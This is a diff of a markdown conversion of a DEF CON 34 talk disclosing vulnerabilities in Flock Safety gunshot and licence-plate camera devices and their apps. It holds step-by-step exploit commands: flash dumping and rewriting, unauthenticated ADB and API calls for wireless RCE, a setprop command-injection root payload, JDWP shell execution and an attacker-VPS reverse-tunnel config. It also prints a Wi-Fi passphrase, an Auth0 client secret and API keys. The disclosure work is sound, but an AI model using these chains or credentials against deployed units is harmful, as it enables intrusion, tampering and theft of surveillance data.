@@ -4,23 +4,28 @@ speakers: ["Jon Gaines"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Jon Gaines - Bird Hunting Season The Final Flight - PDF v1.pdf"
 pages: 47
 sha256: "eeba7a3e2affd75e4f25d11c06c53dc05dda7bf2d5ad8a52450d37edb47eed33"
-text_chars: 94050
+text_chars: 94180
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 1
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-12T00:23:05Z"
+converted_at: "2026-08-12T06:36:12Z"
 ---
 # Bird Hunting Season The Final Flight
 
 **Speakers:** Jon Gaines  
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Jon Gaines - Bird Hunting Season The Final Flight - PDF v1.pdf` (47 pages)
+
 
 ## Slide 1
 
@@ -154,18 +159,18 @@ Why it matters. Disabling Secure Boot allows unsigned or malicious bootloaders a
 
 4. Confirm UART Download Mode support with a second `espefuse` read.
 
-```
+\```
 python -m espefuse --port COM13 summary
 python -m espefuse --port COM13 dump
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 BLOCK2 (secure_boot_v1 s) [2 ] read_regs: 00000000 00000000 00000000 00000000 00000000 00000000
 00000000 00000000 BLOCK2 (BLOCK2) Security boot key= 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 R/W
-```
+\```
 
 Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE assignment request.
 
@@ -195,21 +200,21 @@ Why it matters. An attacker can leverage this access to run debug commands, view
 
 5. Reboot - UART console access is now available.
 
-```
+\```
 python -m espefuse --port COM13 summary
 python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
 ./nvs2cvs.py -t=cvs FlockSafety/Raven-Gunshot/nvs.bin >> FlockSafety/Raven-Gunshot/nvs-csv.csv
 python /esp-idf/components/nvs_flash/nvs_partition_generator/nvs_partition_gen.py generate nvs-
 modified.csv nvs_modified.bin 0x4000
 python -m esptool --port COM13 --chip esp32 write_flash 0x9000 nvs_modified.bin
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 CONSOLE_DEBUG_DISABLE (BLOCK0) Disable ROM BASIC interpreter fallback
 = True R/W (0b1)
-```
+\```
 
 Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE assignment request.
 
@@ -231,13 +236,13 @@ Why it matters. An attacker can leverage this access to run debug commands, view
 
 2. Reboot and note the console requires no authentication (no password prompt/banner).
 
-```
+\```
 python -m espefuse --port COM13 summary
-```
+\```
 
-```
+\```
 # NVS dump / convert / regenerate / flash chain identical to Finding 2
-```
+\```
 
 Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE assignment request.
 
@@ -261,12 +266,12 @@ Why it matters. An attacker can leverage this to obtain a person-in-the-middle (
 
 4. Stand up an AP with SSID `Flock` or `Flock-230503` and the recovered passphrase; boot the unit with LTE unplugged and observe auto-connect.
 
-```
+\```
 python -m esptool --chip esp32 --port COM13 read_flash 0x00000 0x1000000 firmware_dump.bin
 strings firmware_dump.bin | grep 'Flock'
 ./esp32knife.py --chip auto load_from_file firmware_dump.bin
 python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
-```
+\```
 
 - Passphrase for SSID `Flock` : `Ay4TwnB43fmx`
 
@@ -276,11 +281,11 @@ python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
 
 ##### Evidence (from the unit)
 
-```
+\```
 I (116066) WIFI: Preferred SSID not set. Using flockApList. I (116072) WIFI: Connecting to SSID
 Flock I (116088) WIFI: wifi_start finished. I (116093) NET_INT: Network connect to wifi
 returned ok
-```
+\```
 
 Note: This finding was improperly included in CVE-2025-47818 instead of being given its own CVE # when the Vendor submitted the CVE assignment request.
 
@@ -304,20 +309,20 @@ How to reproduce it
 
 3. Alternatively read the `espefuse` summary and note `BLOCK1` is all zeros and `FLASH_CRYPT_CNT` =0.
 
-```
+\```
 python -m esptool --chip esp32 --port COM13 read_flash 0x00000 0x1000000 firmware_dump.bin
 strings firmware_dump.bin | grep -Eo 'http[s]?://[^ ]+'
 python -m espefuse --port COM13 summary
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 Flash fuses: FLASH_CRYPT_CNT (BLOCK0) = 0 R/W (0b0000000) FLASH_CRYPT_CONFIG (BLOCK0) = 0 R/W
 (0x0) BLOCK1 (BLOCK1) Flash encryption key= 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W DISABLE_DL_ENCRYPT (BLOCK0) = False R/W (0b0)
 DISABLE_DL_DECRYPT (BLOCK0) = False R/W (0b0
-```
+\```
 
 #### Finding 6 - Debug Interface Accessible (JTAG)
 
@@ -335,18 +340,18 @@ Why it matters. An attacker with physical access can interface with the JTAG int
 
 ## Slide 9
 
-```
+\```
 python -m espefuse --port COM13 summary
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 Flash fuses: FLASH_CRYPT_CNT (BLOCK0) = 0 R/W (0b0000000) FLASH_CRYPT_CONFIG (BLOCK0) = 0 R/W
 (0x0) BLOCK1 (BLOCK1) Flash encryption key= 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W DISABLE_DL_ENCRYPT (BLOCK0) = False R/W (0b0)
 DISABLE_DL_DECRYPT (BLOCK0) = False R/W (0b0
-```
+\```
 
 #### Finding 7 - Debug Interface Accessible (UART Download)
 
@@ -364,16 +369,16 @@ Why it matters. An attacker with physical access can interface with the JTAG int
 
 2. Confirm via `espefuse` that `UART_DOWNLOAD_DIS (BLOCK0)` = False.
 
-```
+\```
 python -m espefuse --port COM13 summary
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 UART_DOWNLOAD_DIS (BLOCK0)
 = False R/W (0b0)
-```
+\```
 
 Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE number assignment request.
 
@@ -395,15 +400,15 @@ Why it matters. An attacker with physical access can install older and vulnerabl
 
 1. Read the `espefuse` summary and note `SECURE_VERSION (BLOCK3) Secure version for anti-rollback = 0` .
 
-```
+\```
 python -m espefuse --port COM13 summary
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 SECURE_VERSION (BLOCK3) Secure version for anti-rollback = 0 R/W (0x00000000)
-```
+\```
 
 Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE number assignment request.
 
@@ -423,11 +428,11 @@ Why it matters. Plaintext AI/ML binaries let any local or remote foothold copy, 
 
 3. Confirm validity by checking for Syntiant file signatures with `file` / `strings` .
 
-```
+\```
 python -m esptool --chip esp32 --port COM13 read_flash 0x00000 0x1000000 firmware_dump.bin
 ./esp32knife.py --chip auto load_from_file firmware_dump.bin   # carve model region
 file audio_model.bin
-```
+\```
 
 Note: This finding is a affect of Finding 5.
 
@@ -457,10 +462,10 @@ How to reproduce it
 
 `authenticate through auth0 ... falling back to hardcoded api key` .
 
-```
+\```
 python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
 ./nvs2cvs.py -t=cvs nvs.bin >> nvs-csv.csv
-```
+\```
 
 `clientId` : `xvtgsytnYyrs7pk88Q4vLQSbBRCu38GW`
 
@@ -468,10 +473,10 @@ python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
 
 ##### Evidence (from the unit)
 
-```
+\```
 clientId data string xvtgsytnYyrs7pk88Q4vLQSbBRCu38GW clientSecret data string BcyZHIz-
 D49AqQsW83hKdYvXv7W3p8jzc_wluP_cAP5cBmP3mQhNytTEz8BPwm9k
-```
+\```
 
 #### Finding 11 - Lack of Server Verification (DNS Spoofing)
 
@@ -493,9 +498,9 @@ How to reproduce it
 
 ## Slide 12
 
-```
+\```
 The following subdomains were susceptible: device-login.flocksafety.com hpnotiq.flocksafety.com
-```
+\```
 
 Note: This finding requires further research.
 
@@ -529,11 +534,11 @@ How to reproduce it
 
 7. Set SELinux to permissive.
 
-```
+\```
 adb push magisk/ /data/local/tmp/
 adb shell chmod +x boot_patch.sh && ./boot_patch.sh boot.img
 adb pull /data/local/tmp/new-boot.img
-```
+\```
 
 #### Finding 13 - Secure Boot is Disabled
 
@@ -541,9 +546,9 @@ CVSS 9.8 CWE-1104 Disclosed 6/19/2025
 
 CRITICAL
 
-```
+\```
 CVE-2025-47822
-```
+\```
 
 FULL DISCLOSURE ↗
 
@@ -561,11 +566,11 @@ Why it matters. Disabling Secure Boot allows unsigned or malicious bootloaders a
 
 3. Alternatively enter EDL (Force USB button) and confirm via the edl secureboot check - output prints `Secure boot disabled.` (Sahara/Firehose V3.62).
 
-```
+\```
 adb reboot fastboot
 fastboot getvar all        # note secure: no
 ./edl secureboot --loader=ALPR_DDR_Firehose.mbn
-```
+\```
 
 #### Finding 14 - Unlocked Bootloader
 
@@ -583,10 +588,10 @@ Why it matters. An unlocked bootloader permits arbitrary unsigned firmware to be
 
 2. Read variables and note `unlocked:yes` .
 
-```
+\```
 adb reboot fastboot
 fastboot getvar all        # note unlocked: yes
-```
+\```
 
 ## Slide 14
 
@@ -608,9 +613,9 @@ How to reproduce it
 
 2. Note the stock/public firehose loader is accepted with no authentication. The Falcon/Sparrow ALPR firehose ( `ALPR_DDR_Firehose.mbn` ) is published at GainSec/flock-safety-falconsparrow-alpr-edl-firehose.
 
-```
+\```
 ./edl printgpt --loader=ALPR_DDR_Firehose.mbn
-```
+\```
 
 Note: This finding was improperly included with CVE-2025-47822 instead of being given its own CVE # when the Vendor submitted the CVE assignment request.
 
@@ -630,9 +635,9 @@ How to reproduce it
 
 2. `adb shell` in - developer options not required, no on-device approval prompt, no preconfigured ADB server keys.
 
-```
+\```
 adb shell
-```
+\```
 
 ## Slide 15
 
@@ -650,9 +655,9 @@ How to reproduce it
 
 1. With unauthenticated `adb` , sideload an arbitrary APK and note success.
 
-```
+\```
 adb install example.apk
-```
+\```
 
 #### Finding 18 - Lack of Flash/eMMC Encryption
 
@@ -674,11 +679,11 @@ How to reproduce it
 
 3. Optionally mount a partition image with `debugfs` and browse its contents.
 
-```
+\```
 ./edl rf alpr_emmc_firmware.bin --memory=emmc --loader=ALPR_DDR_Firehose.mbn
 debugfs system.img
 debugfs:  ls
-```
+\```
 
 #### Finding 19 - Unsupported End-of-Life Operating System
 
@@ -698,10 +703,10 @@ Why it matters. Attackers can exploit publicly known vulnerabilities that remain
 
 1. Boot the device, connect `adb` , and read the build props with `getprop` - note Android 8.1.0 (EOL).
 
-```
+\```
 adb shell getprop ro.build.version.release
 adb shell getprop ro.build.fingerprint
-```
+\```
 
 #### Finding 20 - Development/Test Credential in Production
 
@@ -753,7 +758,7 @@ How to reproduce it
 
 6. Grant su on first `su` via `scrcpy` ; set SELinux permissive.
 
-```
+\```
 python3 avbtool.py make_vbmeta_image --output custom_vbmeta_a.img \
   --include_descriptors_from_image boot_a.bin \
   --include_descriptors_from_image vendor_boot_a.bin \
@@ -764,7 +769,7 @@ dd if=/dev/zero of=null_vbmeta_system_a.img bs=4096 count=1
 ./edl w vbmeta_system_a null_vbmeta_system_a.img --lun=0 --memory=ufs --
 loader=prog_firehose_ddr.elf
 ./edl w boot_a magisk_patched-29000.img --lun=4 --memory=ufs --loader=prog_firehose_ddr.elf
-```
+\```
 
 #### Finding 22 - Secure Boot is Disabled
 
@@ -784,16 +789,16 @@ How to reproduce it
 
 2. When the blue light appears, boot to fastboot via `adb` and read variables; note `secure:no` .
 
-```
+\```
 adb reboot bootloader
 fastboot getvar all        # note secure: no
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 (bootloader) secure:no
-```
+\```
 
 #### Finding 23 - Unlocked Bootloader
 
@@ -809,16 +814,16 @@ How to reproduce it
 
 1. Boot to fastboot (black USB-C, blue light) and read variables; note `unlocked:yes` .
 
-```
+\```
 adb reboot bootloader
 fastboot getvar all        # note unlocked: yes
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 (bootloader) unlocked:yes
-```
+\```
 
 #### Finding 24 - Lack of Authentication: EDL/QDL Mode
 
@@ -838,9 +843,9 @@ How to reproduce it
 
 2. Note the default `prog_firehose_ddr.elf` firehose is accepted unauthenticated (Sahara/Firehose V3.62).
 
-```
+\```
 ./edl printgpt --memory=ufs --loader=prog_firehose_ddr.elf
-```
+\```
 
 #### Finding 25 - Lack of Authentication - Android Debug Bridge
 
@@ -856,9 +861,9 @@ How to reproduce it
 
 1. Connect USB-C; `adb shell` in - no developer-options requirement, no approval prompt, no pre-shared ADB keys.
 
-```
+\```
 adb shell
-```
+\```
 
 #### Finding 26 - Improper Access Control - ADB Sideload
 
@@ -876,9 +881,9 @@ How to reproduce it
 
 ## Slide 20
 
-```
+\```
 adb install example.apk
-```
+\```
 
 #### Finding 27 - Lack of Flash/UFS Encryption
 
@@ -894,10 +899,10 @@ How to reproduce it
 
 1. Dump a UFS partition with `edl` and confirm cleartext via `strings` .
 
-```
+\```
 ./edl rl dumps/ --memory=ufs --loader=prog_firehose_ddr.elf
 strings dumps/userdata.bin | head
-```
+\```
 
 ### Multi-Device - The App Suite, the Wireless RCE, and the Media Pipeline
 
@@ -998,11 +1003,11 @@ Why it matters. An attacker with adjacent access can leverage unauthenticated AP
 
 3. Use the debug/JDWP `trigger` on a debuggable privileged app to execute commands as `system` (see Finding 55 JDWP chain).
 
-```
+\```
 PUT /api/v1/system/adb/enable
 adb connect <device-ip>:5555
 adb shell id        # uid=2000(shell) -> escalate via JDWP to uid=1000(system)
-```
+\```
 
 #### Finding 31 - Incorrect Default Permissions - Media Recordings Directories
 
@@ -1028,10 +1033,10 @@ Why it matters. An attacker with shell or physical access to a unit can mount or
 
 3. From a secondary process sharing `media_rw` group membership, open any file inside `captured/` or `encoded/` .
 
-```
+\```
 adb shell ls -ld /storage/emulated/0/flockMedia/media     # note drwxrwxr-- and media_rw group
 adb shell id        # confirm media_rw group membership of the reading process
-```
+\```
 
 #### Finding 32 - Shared Media Library Allows Cross-App Data Exposure
 
@@ -1057,10 +1062,10 @@ How to reproduce it
 
 2. Decompile `flock-collins.apk` / `flock-video-streaming.apk` and inspect `MediaFileUtil` ; note it resolves the shared external media tree, so any suite app reads another's captures.
 
-```
+\```
 adb shell dumpsys package com.flocksafety.android.* | grep versionName
 adb shell ls -R /storage/emulated/0/flockMedia/media | head
-```
+\```
 
 #### Finding 33 - Wireless Remote Code Execution (RCE) - Shell
 
@@ -1080,10 +1085,10 @@ Why it matters. An attacker with adjacent access can leverage unauthenticated AP
 
 ## Slide 25
 
-```
+\```
 PUT /api/v1/system/adb/enable
 adb connect <device-ip>:5555 && adb shell
-```
+\```
 
 #### Finding 34 - Unauthenticated Debug Broadcast Clears Settings and Shuts Off Device
 
@@ -1103,10 +1108,10 @@ How to reproduce it
 
 2. The receiver clears settings and powers the device off.
 
-```
+\```
 adb shell am broadcast -a com.flocksaftey.action.DEBUG_ONE_SHOT --es type update --es metadata
 '{"type":"clear"}'
-```
+\```
 
 #### Finding 35 - Multiple Privileged System Apps Shipped with Debugging Enabled
 
@@ -1126,10 +1131,10 @@ How to reproduce it
 
 ## Slide 26
 
-```
+\```
 adb shell dumpsys package com.flocksafety.android.phonehomeservice | grep -i debuggable
 adb shell am set-debug-app --persistent com.flocksafety.android.phonehomeservice
-```
+\```
 
 #### Finding 36 - Lack of Per-File Encryption on Sensitive Media
 
@@ -1153,11 +1158,11 @@ How to reproduce it
 
 3. Pull any file and open it locally - it decrypts with no keys or decrypt step.
 
-```
+\```
 adb shell getprop <media-ready-prop>        # returns true when media staged
 adb shell ls -R /storage/emulated/0/flockMedia/media
 adb pull /storage/emulated/0/flockMedia/media/<session>/<file>.mp4
-```
+\```
 
 #### Finding 37 - Sensitive Information Disclosed - Hardcoded Auth0 Secret
 
@@ -1177,10 +1182,10 @@ How to reproduce it
 
 2. Note the static Auth0 client secret is embedded in cleartext (the original whitepaper left this finding's reproduction body blank).
 
-```
+\```
 apktool d Pisco-v6.21.11.apk -o pisco_out
 grep -R 'auth0_client_secret' pisco_out/
-```
+\```
 
 `auth0_client_secret` : [withheld]
 
@@ -1212,12 +1217,12 @@ How to reproduce it
 
 5. NOTE: SELinux policy blocks execution by default on the analyzed unit; production policy state is unconfirmed.
 
-```
+\```
 adb shell 'setprop persist.vendor.flock.data.logs.max_size_mb "1 ]]; /system/bin/id >
 /data/local/tmp/flock_root #"'
 adb shell 'setprop flock.clean_data_partition 1'
 adb shell cat /data/local/tmp/flock_root     # uid=0(root) gid=0(root) => root code exec
-```
+\```
 
 Note: By default, the Selinux Policy prevents the root commands from being executed, therefore reducing the severity significantly. However, the underlying vulnerability is still there. It is unclear if any of the paths to root, such as the data log cleanup service is used in units currently deployed in the wild.
 
@@ -1237,9 +1242,9 @@ How to reproduce it
 
 2. `deleteSessionFilesFromAllDirs()` does not reliably clear all paths, so plaintext copies accumulate.
 
-```
+\```
 adb shell ls -R /storage/emulated/0/flockMedia/media | grep <session-id>
-```
+\```
 
 ## Slide 29
 
@@ -1249,9 +1254,9 @@ Disclosed
 
 9/27/2025 FULL DISCLOSURE ↗
 
-```
+\```
 CVE-2025-47823
-```
+\```
 
 CVSS
 
@@ -1305,12 +1310,12 @@ How to reproduce it
 
 2. Set the `persist.vendor.flock.data.logs.*` property to a root command-injection payload and trigger `flock.clean_data_partition=1` (Finding 38) to execute as root over Wi-Fi.
 
-```
+\```
 PUT /api/v1/system/adb/enable
 adb connect <device-ip>:5555
 adb shell 'setprop persist.vendor.flock.data.logs.max_size_mb "1 ]]; /system/bin/id >
 /data/local/tmp/flock_root #"; setprop flock.clean_data_partition 1'
-```
+\```
 
 Note: By default, the Selinux Policy prevents the root commands from being executed, therefore reducing the severity significantly. However, the underlying vulnerability is still there. It is unclear if any of the paths to root, such as the data log cleanup service is used in units currently deployed in the wild.
 
@@ -1328,10 +1333,10 @@ How to reproduce it
 
 2. Pull or extract the NativeML artifacts ( `*.tflite` , `models.json` , `label_map*.json` ).
 
-```
+\```
 adb shell ls -R /storage/emulated/0/flockMedia | grep -Ei 'tflite|models.json|label_map'
 adb pull <path>/model.tflite ./loot/
-```
+\```
 
 Note: I'm only aware that the Vendor has been told that the models are accessible. I am unsure who originally discovered them and disclosed them to the Vendor.
 
@@ -1373,9 +1378,9 @@ Why it matters. An attacker with physical access can view, tamper or steal the r
 
 2. Watch the cleanup log while filling the media volume.
 
-```
+\```
 adb logcat -s MediaManagement | grep "Deleting file"
-```
+\```
 
 Note: It is unclear if the devices that are deployed in the wild have different data storage policies.
 
@@ -1397,10 +1402,10 @@ How to reproduce it
 
 1. Confirm a media file exists under the external `flockMedia/media` tree and pull it - it opens without credentials, proving the records are stored unencrypted on external storage.
 
-```
+\```
 adb shell ls -R /storage/emulated/0/flockMedia/media
 adb pull /storage/emulated/0/flockMedia/media/<capture>/clip.mp4
-```
+\```
 
 Note: The severity of this finding has been reduced significantly as it is unclear if units deployed in the wild are configured with this policy.
 
@@ -1434,10 +1439,10 @@ LOW Disclosed 2/11/2026 FULL DISCLOSURE ↗
 
 2. With the FRP tunnel disabled/degraded, capture RTSP media and control traffic on the shared deployment subnet - it traverses without TLS.
 
-```
+\```
 adb pull /data/.../assets/ipconfig.txt        # static LAN fallback profile
 # Wireshark: capture RTSP on the deployment LAN with FRP down
-```
+\```
 
 #### Finding 48 - FRP Tunnel Configuration Permission Weakness
 
@@ -1449,9 +1454,9 @@ LOW Disclosed 2/11/2026 FULL DISCLOSURE ↗
 
 2. Overwrite `frpc.ini` to inject arbitrary tunnels / disable encryption / exfiltrate FRP secrets, then restart the service to load it.
 
-```
+\```
 adb shell su -c 'ls -l /data/user/0/com.flocksafety.android.speedpourer/files/frpc.ini'
-```
+\```
 
 #### Finding 49 - Embedded FRP Reverse Proxy Access Control
 
@@ -1467,7 +1472,7 @@ LOW Disclosed 2/11/2026 FULL DISCLOSURE ↗
 
 ## Slide 34
 
-```
+\```
 # attacker VPS /etc/frp/frps.ini  (lab example)
 [common]
 bind_port = 7000
@@ -1483,7 +1488,7 @@ local_ip = 127.0.0.1
 local_port = 8000
 remote_port = 18080
 adb shell su -c 'am startservice -n com.flocksafety.android.speedpourer/.SpeedPourerService'
-```
+\```
 
 ### Public & Standalone Applications
 
@@ -1503,16 +1508,16 @@ How to reproduce it
 
 1. Decompile the APK; confirm `usesCleartextTraffic="true"` in the manifest and locate hardcoded `http://` endpoints via `strings` .
 
-```
+\```
 apktool d app.apk -o out && grep -R 'usesCleartextTraffic' out/AndroidManifest.xml
 strings out/ -a | grep -Eo 'http://[^ "]+' | sort -u
-```
+\```
 
 ##### Evidence (from the unit)
 
-```
+\```
 android:usesCleartextTraffic="true"
-```
+\```
 
 ## Slide 35
 
@@ -1530,9 +1535,9 @@ How to reproduce it
 
 1. Decompile and read the `AIza` -prefixed Google API key string from `strings.xml` .
 
-```
+\```
 grep -R 'AIza' out/res/values/strings.xml
-```
+\```
 
 Google API key: `AIza[REDACTED:google-api-key]`
 
@@ -1552,9 +1557,9 @@ How to reproduce it
 
 2. Observe full request headers/bodies - including `Authorization` bearer tokens and plate intelligence - logged to logcat.
 
-```
+\```
 adb logcat -s OkHttp
-```
+\```
 
 Note: This application is likely past its End of Life (EOL)
 
@@ -1576,11 +1581,11 @@ How to reproduce it
 
 1. Decompile the app and extract the hardcoded third-party keys/tokens from the JS bundle / resources / `BuildConfig` .
 
-```
+\```
 apktool d 'Field App_2.1.0_APKPure.apk' -o field_out
 grep -Eo '(apiKey|analyticsKey|bugSnagKey|RNUxCamKey|MIXPANEL_TOKEN|bugsnag_key)["= :]+[^,"]+'
 field_out/assets/index.android.bundle
-```
+\```
 
    - `apiKey DovzN73QUSfwtSW7idf7` , `analyticsKey 2q0ognS3MXqrc1DrkdSn701Y3bFQBkLB` , `bugSnagKey d86c32ff4f5b29c3953e7bab0c41da3f` , `RNUxCamKey xhsan43d8gqg1m6 MIXPANEL_TOKEN b9c5c44cb07d5fb223d1d861c7a1513b` , `bugsnag_key bb51512a210b12342408a42d83bac633`
 
@@ -1598,11 +1603,11 @@ How to reproduce it
 
 3. Auth flow gated on `canUseInstallerApp` ; Auth0 management URL references app id `aJeDlI6MEgAmRuDK8DkRPJ3e3Veq62RD` .
 
-```
+\```
 apktool d -f com.flocksafety.hazyhiwire.apk -o hazyhiwire_out
 grep -REn 'http://|LAPI|onvif|penguin-pack|raven_configurations' hazyhiwire_out/smali
 hazyhiwire_out/assets
-```
+\```
 
 ## Slide 37
 
@@ -1630,13 +1635,13 @@ How to reproduce it
 
 - *Shout out to Joe Cohen for PoCing the JDWP execution.
 
-```
+\```
 adb -s 241108P02100632 jdwp
 adb -s 241108P02100632 forward tcp:8700 jdwp:<pid>
 python3 scripts/jdwp-shellifier-py3.py -t 127.0.0.1 -p 8700 --break-on
 java.net.ServerSocket.accept -c "<cmd>"
 python3 scripts/jdwp_exec.py "id"     # uid=1000(system) context=u:r:flock_app:s0
-```
+\```
 
 ### The Leaked Feeds - a story, not a finding
 
@@ -1773,14 +1778,14 @@ Raven - 16 MB SPI flash (offsets for targeted `esptool` reads):
 
 ## Slide 42
 
-```
+\```
 nvs       0x009000  0x004000   # Wi-Fi creds, consoleLogEn, API client creds
 otadata   0x00d000  0x002000
 phy_init  0x00f000  0x001000
 ota_0     0x010000  0x400000   # app slot (audio_event_detection)
 ota_1     0x410000  0x400000
 storage   0x810000  0x150000
-```
+\```
 
 LPR - eMMC (GPT), key partitions: `boot @0x18200000` , `recovery @0x1a200000` , `system` (ext4) `@0x1c300000` , plus `vendor` , `userdata` , `modem` , `tz` , `aboot` , `keystore` , `persist` , `misc` . Ships `unlocked:yes` / `secure:no` .
 
@@ -1824,10 +1829,10 @@ Spotting them in the wild. When a unit's hotspot is up, it broadcasts an SSID of
 
 `74:4C:A1:7E:B8:71` → `Flock-7EB871` ). That pattern is trivially searchable: a WiGLE SSID search for `Flock-` returned 900+ hits - 992 when I ran it, months back - many with an active hotspot, some going back years. The query is just that SSID prefix; on WiGLE's API it's an SSID-wildcard search:
 
-```
+\```
 GET https://api.wigle.net/api/v2/network/search?ssidlike=Flock-%
     (with your WiGLE API Basic-auth header)
-```
+\```
 
 So between Trap Shooter on the ground and WiGLE for the map, you can locate these without ever touching one.
 
